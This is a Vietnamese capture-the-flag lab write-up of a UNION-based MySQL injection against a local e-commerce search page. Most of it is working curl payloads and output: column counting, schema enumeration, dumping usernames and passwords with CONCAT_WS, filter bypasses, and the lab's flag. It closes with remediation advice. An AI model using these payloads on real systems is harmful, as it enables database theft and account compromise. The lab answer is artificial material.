# SQLi-019: MySQL Union-based Single Column - Complete Writeup

## 📋 Tóm Tắt

Bài lab này yêu cầu khai thác SQL Injection trên MySQL sử dụng kỹ thuật **Union-based** với `CONCAT_WS` để ghép nhiều giá trị khi chỉ có 1 column được hiển thị.

**Độ khó:** Medium  
**Kỹ thuật:** MySQL Union-based với CONCAT/CONCAT_WS  
**Mục tiêu:** Trích xuất flag từ bảng `flags`

---

## 🔍 Bước 1: DETECT - Tìm Điểm Chèn

### 1.1 Khám phá ứng dụng

Truy cập URL: `http://localhost:5019/`

Ứng dụng có chức năng search sản phẩm. THử tìm kiếm "iphone":

```
http://localhost:5019/search?q=iphone
```

**Response:** Hiển thị danh sách tên sản phẩm matching.

### 1.2 Phát hiện SQL Injection

```bash
# Test 1: Single quote
curl "http://localhost:5019/search?q='"
# ❌ Error: (1064, "You have an error in your SQL syntax...")

# Test 2: Double quote
curl "http://localhost:5019/search?q=\""
# ✅ Không lỗi (string trong SQL dùng single quote)

# Test 3: Comment injection
curl "http://localhost:5019/search?q=iphone'--+"
# ✅ Hoạt động bình thường

# Test 4: Boolean logic
curl "http://localhost:5019/search?q=iphone' AND '1'='1"
# ✅ Trả về kết quả

curl "http://localhost:5019/search?q=iphone' AND '1'='2"
# ❌ Không trả về kết quả
```

**Kết luận:** Ứng dụng có lỗ hổng SQL Injection tại parameter `q`!

---

## 🎯 Bước 2: IDENTIFY - Xác Định Database

### 2.1 Xác định DBMS từ error message

```bash
curl "http://localhost:5019/search?q='"
```

**Error Response:**
```
(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...")
```

→ Đây là **MySQL**!

### 2.2 Xác nhận version

```bash
# Dùng comment MySQL-specific
curl "http://localhost:5019/search?q=iphone'/**/AND/**/1=1--"
# ✅ Hoạt động → MySQL confirmed
```

---

## 🔢 Bước 3: ENUMERATE - Liệt Kê Cấu Trúc

### 3.1 Xác định số columns trong query gốc

```bash
# ORDER BY technique
curl "http://localhost:5019/search?q=' ORDER BY 1-- -"
# ✅ Không lỗi

curl "http://localhost:5019/search?q=' ORDER BY 2-- -"
# ❌ Error: Unknown column '2' in 'order clause'
```

→ Query gốc chỉ có **1 column**!

### 3.2 Xác nhận với UNION SELECT

```bash
curl "http://localhost:5019/search?q=' UNION SELECT NULL-- -"
# ✅ Hoạt động

curl "http://localhost:5019/search?q=' UNION SELECT 'test'-- -"
# ✅ Hiển thị "test" trong results
```

### 3.3 Enumerate databases

```bash
curl "http://localhost:5019/search?q=' UNION SELECT schema_name FROM information_schema.schemata-- -"
```

**Results:**
```
information_schema
ecommerce
mysql
performance_schema
sys
```

### 3.4 Enumerate tables trong database `ecommerce`

```bash
curl "http://localhost:5019/search?q=' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='ecommerce'-- -"
```

**Results:**
```
products
users
flags
```

→ Phát hiện 3 bảng: `products`, `users`, `flags`!

### 3.5 Enumerate columns trong bảng `users`

```bash
curl "http://localhost:5019/search?q=' UNION SELECT column_name FROM information_schema.columns WHERE table_schema='ecommerce' AND table_name='users'-- -"
```

**Results:**
```
id
username
password
email
role
```

### 3.6 Enumerate columns trong bảng `flags`

```bash
curl "http://localhost:5019/search?q=' UNION SELECT column_name FROM information_schema.columns WHERE table_schema='ecommerce' AND table_name='flags'-- -"
```

**Results:**
```
id
name
value
```

---

## 📤 Bước 4: EXTRACT - Lấy Dữ Liệu

### 4.1 Vấn đề: Chỉ có 1 column

Query gốc chỉ SELECT 1 column (name), nên ta không thể dùng:
```sql
' UNION SELECT username, password FROM users-- -
-- ❌ Error: The used SELECT statements have a different number of columns
```

### 4.2 Giải pháp: CONCAT_WS

Sử dụng `CONCAT_WS` để ghép nhiều giá trị thành 1 string:

```bash
# Syntax: CONCAT_WS(separator, string1, string2, ...)
curl "http://localhost:5019/search?q=' UNION SELECT CONCAT_WS(':',username,password) FROM users-- -"
```

**Results:**
```
admin:Sup3rS3cr3tP@ss!
john_doe:john123456
jane_smith:janepass789
bob_wilson:bobwilson2024
manager:M@nag3r_2024
```

### 4.3 Lấy thông tin chi tiết hơn

```bash
# Username:Password:Email:Role
curl "http://localhost:5019/search?q=' UNION SELECT CONCAT_WS(' | ',username,password,email,role) FROM users-- -"
```

**Results:**
```
admin | Sup3rS3cr3tP@ss! | admin@ecommerce.local | admin
john_doe | john123456 | john@example.com | user
jane_smith | janepass789 | jane@example.com | user
bob_wilson | bobwilson2024 | bob@example.com | user
manager | M@nag3r_2024 | manager@ecommerce.local | manager
```

---

## ⬆️ Bước 5: ESCALATE - Leo Thang Quyền

### 5.1 Phân tích credentials

Từ kết quả extract, ta có:
- **Admin account:** `admin:Sup3rS3cr3tP@ss!`
- **Manager account:** `manager:M@nag3r_2024`

### 5.2 Kiểm tra quyền database

```bash
# Kiểm tra current user
curl "http://localhost:5019/search?q=' UNION SELECT user()-- -"
# Result: root@172.x.x.x

# Kiểm tra privileges
curl "http://localhost:5019/search?q=' UNION SELECT CONCAT_WS(':',grantee,privilege_type) FROM information_schema.user_privileges-- -"
```

→ App đang chạy với quyền **root** (không tốt cho security!)

---

## 🏆 Bước 6: EXFILTRATE - Trích Xuất Flag

### 6.1 Lấy flag từ bảng flags

```bash
curl "http://localhost:5019/search?q=' UNION SELECT CONCAT_WS(':',name,value) FROM flags-- -"
```

**Result:**
```
sqli_019:FLAG{un10n_c0nc4t_m4st3r}
```

### 6.2 Hoặc lấy trực tiếp value

```bash
curl "http://localhost:5019/search?q=' UNION SELECT value FROM flags WHERE name='sqli_019'-- -"
```

**Result:**
```
FLAG{un10n_c0nc4t_m4st3r}
```

🎉 **FLAG:** `FLAG{un10n_c0nc4t_m4st3r}`

---

## 📝 Summary of Exploitation Chain

```
1. DETECT      → Single quote triggers SQL error
2. IDENTIFY    → MySQL database (error message pattern)
3. ENUMERATE   → 1 column query, 3 tables (products, users, flags)
4. EXTRACT     → CONCAT_WS to combine username:password
5. ESCALATE    → Found admin credentials
6. EXFILTRATE  → FLAG{un10n_c0nc4t_m4st3r}
```

**Complete Payload Sequence:**

```bash
# Step 1: Detect SQLi
curl "http://localhost:5019/search?q='"

# Step 2: Find column count
curl "http://localhost:5019/search?q=' ORDER BY 1-- -"
curl "http://localhost:5019/search?q=' ORDER BY 2-- -"

# Step 3: Enumerate tables
curl "http://localhost:5019/search?q=' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='ecommerce'-- -"

# Step 4: Enumerate columns
curl "http://localhost:5019/search?q=' UNION SELECT column_name FROM information_schema.columns WHERE table_name='flags'-- -"

# Step 5: Extract users with CONCAT_WS
curl "http://localhost:5019/search?q=' UNION SELECT CONCAT_WS(':',username,password) FROM users-- -"

# Step 6: Get flag
curl "http://localhost:5019/search?q=' UNION SELECT value FROM flags-- -"
```

---

## 🎓 Bài Học Quan Trọng

### 1. CONCAT vs CONCAT_WS

| Function    | Syntax                              | NULL handling           |
| ----------- | ----------------------------------- | ----------------------- |
| CONCAT      | CONCAT(s1, s2, s3)                  | Returns NULL if any NULL|
| CONCAT_WS   | CONCAT_WS(sep, s1, s2, s3)          | Skips NULL values       |

**Khuyến nghị:** Dùng `CONCAT_WS` vì:
- Có separator rõ ràng
- Không bị NULL làm hỏng output

### 2. Bypass Techniques

Nếu bị filter spaces:
```sql
'/**/UNION/**/SELECT/**/CONCAT_WS(':',username,password)/**/FROM/**/users-- -
```

Nếu bị filter quotes:
```sql
' UNION SELECT CONCAT_WS(0x3a,username,password) FROM users-- -
-- 0x3a = ':' in hex
```

### 3. Alternatve: GROUP_CONCAT

Nếu cần aggregate nhiều rows thành 1:
```sql
' UNION SELECT GROUP_CONCAT(CONCAT_WS(':',username,password) SEPARATOR '<br>') FROM users-- -
```

---

## 🛡️ Cách Phòng Chống

### 1. Sử dụng Prepared Statements

```python
# ❌ Vulnerable
sql = f"SELECT name FROM products WHERE name LIKE '%{query}%'"

# ✅ Secure
sql = "SELECT name FROM products WHERE name LIKE %s"
cursor.execute(sql, (f'%{query}%',))
```

### 2. Input Validation

```python
import re
# Chỉ cho phép alphanumeric và spaces
if not re.match(r'^[a-zA-Z0-9 ]+$', query):
    return "Invalid input", 400
```

### 3. Least Privilege

```sql
-- Tạo user riêng cho app với quyền hạn chế
CREATE USER 'app_user'@'%' IDENTIFIED BY 'password';
GRANT SELECT ON ecommerce.products TO 'app_user'@'%';
-- Không grant access vào users/flags tables
```

---

## 📚 References

- [MySQL CONCAT_WS Documentation](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_concat-ws)
- [PortSwigger - UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [PayloadsAllTheThings - MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

---

## ✅ Flag

```
FLAG{un10n_c0nc4t_m4st3r}
```

**Ý nghĩa flag:**
- `un10n` → UNION (leet: i=1, o=0)
- `c0nc4t` → CONCAT (leet: o=0, a=4)
- `m4st3r` → master (leet: a=4, e=3)

---

**🎯 Completed:** SQLi-019 - MySQL Union-based Single Column Exploitation
